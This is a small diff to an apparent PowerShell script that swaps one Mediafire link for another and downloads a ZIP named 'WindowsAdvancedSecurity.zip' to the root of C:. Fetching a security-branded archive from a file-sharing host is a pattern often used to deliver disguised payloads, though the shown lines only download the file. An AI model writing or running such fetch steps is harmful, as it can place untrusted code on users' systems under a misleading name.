@@ -1,5 +1,5 @@
 # Download the ZIP file from Mediafire
-$downloadLink = "https://download843.mediafire.com/pkakszg4bt5gqcA7HSen-Uf2caYzIYTFvCW2BsAgitxQIm3TjNlHJSgwmyih2FXgWsJ0BZ0cRJjDrkH190sukn12ShfzCSid6MeFPJDuTGpDcsUrLLcFOrj7BGRN0jVlqg7rrA5fbZwji2EZYdefJ8AghseIVWW2ZsH6hiv97g/s1m5k1yhrjbbpk0/WindowsAdvancedSecurity.zip"
+$downloadLink = "https://download843.mediafire.com/qx6s9adx4pvgraPltumC-mG6EOI9RZteoLlgHDmFzeloHehnhbwX2vIxASH3Ue9w3jwC1YSizkKvTI0o-2FPLyIUOCpuuutS46ZIp3R8i-5y_BHd7NmRXvYalF3bX2HBzf1zrURRw5kQGAzwFPjBgnWkjq4K9Utif2PI9p6y/s1m5k1yhrjbbpk0/WindowsAdvancedSecurity.zip"
 $destinationPath = "C:\WindowsAdvancedSecurity.zip"
 Invoke-WebRequest -Uri $downloadLink -OutFile $destinationPath
 
